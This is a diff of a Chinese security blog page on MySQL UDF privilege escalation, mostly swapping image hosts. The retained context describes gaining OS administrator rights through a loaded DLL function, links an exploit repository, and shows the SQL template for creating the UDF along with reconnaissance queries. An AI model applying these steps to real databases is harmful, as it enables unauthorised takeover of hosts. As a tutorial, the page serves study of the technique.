@@ -23,66 +23,66 @@
 <meta property="og:site_name" content="AU9U5T">
 <meta property="og:description" content="MySQL提权利用场景目标主机开启MySQL远程连接，并且攻击者已经获得MySQL数据库连接的用户名和密码信息，通过  UDF手工提权获得操作系统管理员权限。    拥有数据库账号密码，可以远程连接数据   拥有Webshell，可以连接数据库   能够写文件   可以操作数据库  如果获取数据库的密码  找到数据库的配置文件 通过webshell 对数据库进行本地爆破 msf 或者专门爆破数据库">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215101243733.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105536087.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105721000.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105918482.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215110338733.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112131932.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112346100.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112404664.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112550900.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215122209811.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/headImg.action">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215134913223.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215144628397.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215145039673.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215152920401.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215153044752.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215153647318.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161200237.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161356356.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161801232.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161831849.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161938401.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162022370.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162259053.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162344359.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215172129452.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165407281.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165531521.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165638535.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215170141213.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215170146132.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215172521282.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215173040705.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215173137205.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175247691.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175411134.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175452631.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175624395.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175827623.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175915802.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215180019008.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215180112016.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181329634.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181351775.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181533737.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182353487.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182621619.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182818735.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182942969.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183026173.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183141883.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183307294.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183855762.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183912072.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215101243733.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105536087.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105721000.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105918482.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215110338733.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112131932.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112346100.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112404664.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112550900.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215122209811.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/headImg.action">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215134913223.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215144628397.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215145039673.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215152920401.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215153044752.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215153647318.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161200237.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161356356.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161801232.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161831849.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161938401.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162022370.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162259053.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162344359.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215172129452.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165407281.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165531521.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165638535.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215170141213.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215170146132.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215172521282.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215173040705.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215173137205.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175247691.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175411134.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175452631.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175624395.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175827623.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175915802.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215180019008.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215180112016.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181329634.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181351775.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181533737.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182353487.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182621619.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182818735.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182942969.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183026173.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183141883.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183307294.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183855762.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183912072.png">
 <meta property="article:published_time" content="2024-02-15T01:37:07.000Z">
-<meta property="article:modified_time" content="2024-03-17T15:19:30.538Z">
+<meta property="article:modified_time" content="2025-06-01T09:42:24.480Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215101243733.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215101243733.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -411,7 +411,7 @@
 <p>  <a target="_blank" rel="noopener" href="https://github.com/ym2011/POC-EXP/tree/master/K8/Mysql%E6%8F%90%E6%9D%83">https://github.com/ym2011/POC-EXP/tree/master/K8/Mysql%E6%8F%90%E6%9D%83</a>  </p>
 </blockquote>
 <p>查看dll 文件导出函数</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215101243733.png" srcset="/img/loading.gif" lazyload alt="image-20240215101243733"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215101243733.png" srcset="/img/loading.gif" lazyload alt="image-20240215101243733"></p>
 <ol>
 <li><p>创建函数</p>
 <figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">create</span> <span class="hljs-function"><span class="hljs-keyword">function</span> 函数名<span class="hljs-params">(区分大小写)</span></span> returns <span class="hljs-built_in">string</span> soname <span class="hljs-string">&quot;dll名&quot;</span> (注意路径);<br></code></pre></td></tr></table></figure>
@@ -432,24 +432,24 @@
 <li><p>查看操作系统的版本，确定使用什么文件</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>_compile_os, @<span class="hljs-variable">@version</span>_compile_machine;<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%compile%&#x27;</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105536087.png" srcset="/img/loading.gif" lazyload alt="image-20240215105536087"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105536087.png" srcset="/img/loading.gif" lazyload alt="image-20240215105536087"></p>
 </li>
 <li><p>查看mysql 的安装路径和版本</p>
